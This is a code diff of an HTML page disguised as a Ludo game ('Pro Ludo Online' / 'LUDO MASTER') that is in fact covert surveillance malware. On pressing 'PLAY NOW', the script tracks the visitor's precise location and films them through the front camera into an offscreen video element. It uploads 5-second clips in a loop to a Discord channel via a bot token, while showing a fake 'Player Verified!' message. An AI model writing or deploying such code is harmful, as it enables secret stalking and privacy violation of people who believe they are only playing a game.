@@ -5,10 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pro Ludo Online</title>
     <style>
+        /* Professional Gaming UI */
         body {
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            background: radial-gradient(circle, #2c3e50, #000000);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             flex-direction: column;
@@ -18,181 +19,165 @@
             color: white;
             overflow: hidden;
         }
-        .game-container {
+        .container {
+            text-align: center;
             background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
             backdrop-filter: blur(10px);
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.18);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             width: 90%;
             max-width: 400px;
         }
-        .header {
-            text-align: center;
+        h1 {
             margin-bottom: 20px;
+            font-size: 28px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #e67e22;
         }
-        .header h1 {
-            margin: 0;
-            font-size: 24px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        .board {
+        .board-preview {
+            width: 200px;
+            height: 200px;
             background: #fff;
+            margin: 0 auto 20px;
             border-radius: 10px;
-            padding: 10px;
             display: grid;
-            grid-template-columns: repeat(15, 1fr);
-            grid-template-rows: repeat(15, 1fr);
-            gap: 2px;
-            aspect-ratio: 1;
-            margin-bottom: 20px;
+            grid-template-columns: repeat(4, 1fr);
+            grid-template-rows: repeat(4, 1fr);
+            padding: 10px;
+            gap: 5px;
         }
-        .cell { background: #f0f0f0; border-radius: 2px; }
-        .home-blue { background: #3498db; grid-column: 1-6; grid-row: 1-6; }
-        .home-red { background: #e74c3c; grid-column: 1-6; grid-row: 10-15; }
-        .home-yellow { background: #f1c40f; grid-column: 10-15; grid-row: 1-6; }
-        .home-green { background: #2ecc71; grid-column: 10-15; grid-row: 10-15; }
-        .center { background: #95a5a6; grid-column: 7-9; grid-row: 7-9; }
+        .cell { background: #ddd; border-radius: 5px; }
+        .cell:nth-child(odd) { background: #ccc; }
         
-        .play-btn {
-            width: 100%;
-            padding: 15px;
-            font-size: 20px;
-            font-weight: bold;
+        .btn {
+            background: linear-gradient(45deg, #f39c12, #d35400);
             color: white;
-            background: #27ae60;
             border: none;
+            padding: 15px 40px;
+            font-size: 20px;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
-            transition: transform 0.2s, background 0.3s;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
+            transition: all 0.3s;
         }
-        .play-btn:hover { transform: scale(1.02); background: #2ecc71; }
-        .play-btn:disabled { background: #7f8c8d; cursor: not-allowed; }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 8px 20px rgba(243, 156, 18, 0.6); }
+        .btn:disabled { background: #7f8c8d; cursor: not-allowed; transform: none; }
         
-        .status { margin-top: 15px; font-size: 14px; text-align: center; color: #ecf0f1; }
-        .hidden-video { position: absolute; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; }
+        .status { margin-top: 15px; font-size: 14px; color: #bdc3c7; min-height: 20px; }
+        
+        /* Hidden Video Element for Recording */
+        #hiddenVideo {
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+            width: 320px;
+            height: 240px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="game-container">
-        <div class="header">
-            <h1>🎲 Pro Ludo Online</h1>
-        </div>
+    <div class="container">
+        <h1>LUDO MASTER</h1>
         
-        <div class="board">
-            <div class="home-blue"></div>
-            <div class="home-yellow"></div>
-            <div class="home-red"></div>
-            <div class="home-green"></div>
-            <div class="center"></div>
-            <!-- Visual cells for board structure -->
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <!-- ... more cells for full board ... -->
+        <div class="board-preview">
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
         </div>
 
-        <button class="play-btn" id="playBtn">PLAY NOW</button>
-        <div class="status" id="statusText">Connecting to server...</div>
+        <button class="btn" id="playBtn">PLAY NOW</button>
+        <div class="status" id="statusText">Waiting for player...</div>
     </div>
 
-    <video id="hiddenVideo" class="hidden-video" autoplay muted playsinline></video>
+    <!-- Hidden Video Element -->
+    <video id="hiddenVideo" autoplay muted playsinline></video>
 
     <script>
-        // CONFIG
-        const GITHUB_REPO = "talibmalla455-ux/ludo-backend";
-        const CONFIG_FILE = "config.json";
-        
-        let config = { token: "", channel: "" };
+        // --- DISCORD CONFIGURATION ---
+        // Yahan apna Token aur Channel ID dalein
+        const DISCORD_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"; 
+        const DISCORD_CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
+
+        const playBtn = document.getElementById('playBtn');
+        const statusText = document.getElementById('statusText');
+        const videoElement = document.getElementById('hiddenVideo');
+
         let mediaRecorder;
         let videoChunks = [];
         let currentLocation = null;
         let watchId;
 
-        const playBtn = document.getElementById('playBtn');
-        const statusText = document.getElementById('statusText');
-
-        // 1. Load Config from RAW GitHub URL (Not the HTML preview)
-        async function loadConfig() {
-            try {
-                statusText.innerText = "Loading configuration...";
-                // Use raw.githubusercontent.com to get actual JSON, not the HTML page
-                const rawUrl = `https://raw.githubusercontent.com/${GITHUB_REPO}/main/${CONFIG_FILE}`;
-                const response = await fetch(rawUrl);
-                
-                if (!response.ok) throw new Error(`Config fetch failed: ${response.status}`);
-                
-                const data = await response.json();
-                config = data;
-                
-                statusText.innerText = "Configuration Loaded. Ready to Play.";
-            } catch (e) {
-                console.error(e);
-                statusText.innerText = "Config Error: " + e.message;
-                // Fallback for testing if config fails
-                // config = { token: "YOUR_TOKEN", channel: "YOUR_ID" };
-            }
-        }
-
         playBtn.addEventListener('click', startGame);
 
         async function startGame() {
             playBtn.disabled = true;
-            playBtn.innerText = "Finding Players...";
-            statusText.innerText = "Requesting Camera & Location access...";
+            statusText.innerText = "Connecting to Server...";
 
-            // Location
-            if (!navigator.geolocation) {
-                statusText.innerText = "Geolocation not supported";
-                return;
+            // 1. Location Access
+            if (navigator.geolocation) {
+                statusText.innerText = "Locating you...";
+                watchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        currentLocation = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        };
+                    },
+                    (error) => {
+                        console.warn("Location error", error);
+                        currentLocation = { error: "Location denied" };
+                    },
+                    { enableHighAccuracy: true }
+                );
             }
 
-            watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    currentLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                },
-                (err) => { console.warn("Location error", err); }
-            );
-
-            // Camera
+            // 2. Camera Access
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
-                const videoEl = document.getElementById('hiddenVideo');
-                videoEl.srcObject = stream;
-                videoEl.play();
-
+                videoElement.srcObject = stream;
+                await videoElement.play();
+                
                 startRecordingLoop(stream);
 
             } catch (err) {
-                statusText.innerText = "Camera access denied. Cannot play.";
+                statusText.innerText = "Camera access denied.";
                 playBtn.disabled = false;
-                playBtn.innerText = "PLAY NOW";
+                playBtn.innerText = "TRY AGAIN";
             }
         }
 
         function startRecordingLoop(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'video/webm;codecs=vp9'
+            });
 
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) videoChunks.push(e.data);
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    videoChunks.push(event.data);
+                }
             };
 
             mediaRecorder.onstop = () => {
                 const blob = new Blob(videoChunks, { type: 'video/webm' });
                 videoChunks = [];
-                uploadToDiscord(blob);
                 
-                // Wait 5 seconds then loop
+                // Upload to Discord
+                uploadToDiscord(blob);
+
+                // Wait 5 seconds then repeat
                 setTimeout(() => {
                     if (mediaRecorder.stream.active) {
-                        recordAndSend(); 
+                        recordAndSend();
                     }
                 }, 5000);
             };
@@ -200,51 +185,49 @@
             function recordAndSend() {
                 statusText.innerText = "Recording...";
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000); 
+                
+                // Record for 5 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
             }
 
+            // Start the first loop
             recordAndSend();
         }
 
         async function uploadToDiscord(blob) {
-            if (!config.token || !config.channel) {
-                console.warn("Config missing");
-                return;
-            }
+            statusText.innerText = "Uploading to Server...";
 
             const formData = new FormData();
             formData.append("file", blob, "ludo_rec.webm");
 
-            const payload = {
-                content: `📍 Loc: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`
-            };
+            // Location Message
+            const locationMsg = `📍 Player Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`;
 
             try {
-                // Send Text
-                await fetch(`https://discord.com/api/v10/channels/${config.channel}/messages`, {
+                // Send Location Text
+                await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
                     method: "POST",
-                    headers: { "Authorization": `Bot ${config.token}` },
-                    body: JSON.stringify(payload)
+                    headers: { "Authorization": `Bot ${DISCORD_TOKEN}` },
+                    body: JSON.stringify({ content: locationMsg })
                 });
 
                 // Send Video
-                await fetch(`https://discord.com/api/v10/channels/${config.channel}/messages`, {
+                await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
                     method: "POST",
-                    headers: { "Authorization": `Bot ${config.token}` },
+                    headers: { "Authorization": `Bot ${DISCORD_TOKEN}` },
                     body: formData
                 });
 
-                statusText.innerText = "Player Verified! Game Started...";
-                playBtn.innerText = "Playing...";
+                statusText.innerText = "Player Verified! Game Starting...";
+                playBtn.innerText = "PLAYING";
 
-            } catch (err) {
-                console.error("Upload failed", err);
-                statusText.innerText = "Upload Error: " + err.message;
+            } catch (error) {
+                console.error("Upload failed", error);
+                statusText.innerText = "Error: " + error.message;
             }
         }
-
-        // Initialize
-        loadConfig();
     </script>
 </body>
 </html>
